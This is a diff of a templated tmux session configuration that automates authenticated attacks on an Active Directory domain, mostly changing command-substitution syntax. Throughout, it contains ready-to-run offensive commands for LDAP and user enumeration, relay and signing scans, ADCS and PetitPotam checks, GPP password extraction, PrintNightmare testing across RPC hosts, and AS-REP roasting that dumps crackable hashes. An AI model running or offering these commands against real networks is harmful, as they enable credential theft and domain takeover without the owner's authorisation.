@@ -43,23 +43,23 @@ windows:
         - ldapdomaindump:
           - tmux select-pane -T 'ldapdomaindump' -t "authd:LDAP.0"
           - mkdir <%= @settings["rootDir"] %>/loot/ldap-domaindump && cd <%= @settings["rootDir"] %>/loot/ldap-domaindump
-          - ldapdomaindump -u '<%= @settings["domain"] %>\<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1`
+          - ldapdomaindump -u '<%= @settings["domain"] %>\<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1)
         - getADusers:
           - tmux select-pane -T 'getADusers' -t "authd:LDAP.1"
-          - GetADUsers.py -all '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>' -dc-ip `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` | tee <%= @settings["rootDir"] %>/scans/ldap/getADUsers.txt
+          - GetADUsers.py -all '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>' -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) | tee <%= @settings["rootDir"] %>/scans/ldap/getADUsers.txt
         - ldap signing:
           - tmux select-pane -T 'ldap signing' -t "authd:LDAP.2"
           - cd /opt/nomad-tools/LdapRelayScan/
           - python3 LdapRelayScan.py -method BOTH -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' | tee <%= @settings["rootDir"] %>/scans/ldap/ldapSigning.txt
         - get user descriptions:
           - tmux select-pane -T 'get user descriptions' -t "authd:LDAP.3"
-          - crackmapexec ldap `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M get-desc-users | tee <%= @settings["rootDir"] %>/scans/ldap/userDescriptions.txt
+          - crackmapexec ldap $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M get-desc-users | tee <%= @settings["rootDir"] %>/scans/ldap/userDescriptions.txt
         - MAQ:
           - tmux select-pane -T 'MAQ' -t "authd:LDAP.4"
-          - crackmapexec ldap `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M MAQ | tee <%= @settings["rootDir"] %>/scans/ldap/MAQ.txt
+          - crackmapexec ldap $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M MAQ | tee <%= @settings["rootDir"] %>/scans/ldap/MAQ.txt
         - ldap-checker:
           - tmux select-pane -T 'ldap-checker' -t "authd:LDAP.5"
-          - crackmapexec ldap `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M ldap-checker | tee <%= @settings["rootDir"] %>/scans/ldap/ldap-checker-cme.txt
+          - crackmapexec ldap $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M ldap-checker | tee <%= @settings["rootDir"] %>/scans/ldap/ldap-checker-cme.txt
   - kerberoasting: 
       pre: mkdir -p <%= @settings["rootDir"] %>/loot/kerberoast
       panes:
@@ -94,17 +94,17 @@ windows:
       panes:
         - cme ADCS:
           - tmux select-pane -T 'cme ADCS' -t "authd:ADCS.0"
-          - crackmapexec ldap `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M adcs
+          - crackmapexec ldap <%= @settings["rootDir"] %>/dcIP.txt -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M adcs
         - certipy:
           - tmux select-pane -T 'certipy' -t "authd:ADCS.1"
           - mkdir <%= @settings["rootDir"] %>/certipy
-          - certipy find -u '<%= @settings["user"] %>@<%= @settings["domain"] %>' -p '<%= @settings["pass"] %>' -dc-ip `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` -old-bloodhound -scheme ldap | tee <%= @settings["rootDir"] %>/loot/ADCS/certipy.txt
+          - certipy find -u '<%= @settings["user"] %>@<%= @settings["domain"] %>' -p '<%= @settings["pass"] %>' -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -old-bloodhound -scheme ldap | tee <%= @settings["rootDir"] %>/loot/ADCS/certipy.txt
   - PetitPotam: 
       panes:
         - PetitPotam:
           - tmux select-pane -T 'PetitPotam' -t "authd:PetitPotam.0"
           - cd <%= @settings["rootDir"] %>/scans
-          - crackmapexec smb `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M petitpotam | tee <%= @settings["rootDir"] %>/scans/petitpotam.txt
+          - crackmapexec smb $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M petitpotam | tee <%= @settings["rootDir"] %>/scans/petitpotam.txt
   - misc: 
       panes:
         - printNightmare:
@@ -115,10 +115,10 @@ windows:
           # grab hosts with open RPC ports (often more are found through additional nmap scans, but this can also be modified to use results from masscan)
           - msfconsole -q -x 'msfWorkspace -a <%= @settings["msfWorkspace"]  %>; services -u -O 6 -p 111,135,593,2049 -o <%= @settings["rootDir"] %>/scans/Lists/rpcHosts.txt -c name; exit' && cat <%= @settings["rootDir"] %>/scans/Lists/rpcHosts.txt | sed '1d' | cut -d "," -f 1 | tr -d '"' > <%= @settings["rootDir"] %>/scans/Lists/rpcHosts-cleaned.txt
           # create docker container to test printerNightmare
-          - for i in `cat <%= @settings["rootDir"] %>/scans/Lists/rpcHosts-cleaned.txt`; do echo testing:$i; sudo docker run -it itwasalladream -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> $i; echo ""; done
+          - for i in $(cat <%= @settings["rootDir"] %>/scans/Lists/rpcHosts-cleaned.txt); do echo testing:$i; sudo docker run -it itwasalladream -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> $i; echo ""; done
         - GPP password:
           - tmux select-pane -T 'GPP password' -t "authd:misc.1"
-          - crackmapexec smb `cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1` -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M gpp_password | tee <%= @settings["rootDir"] %>/scans/GPPpassword.txt
+          - crackmapexec smb <%= @settings["rootDir"] %>/dcIP.txt -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M gpp_password | tee <%= @settings["rootDir"] %>/scans/GPPpassword.txt
         - authd ASREProast:
           - tmux select-pane -T 'authd ASREP roast' -t "authd:misc.2"
           - <%= @settings["prefill"] %> 'GetNPUsers.py <%= @settings["domain"] %>/ -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -no-pass -usersfile $USERNAMEFILE.txt -outputfile <%= @settings["rootDir"] %>/scans/authd-asrepRoast.txt -format john'; clear
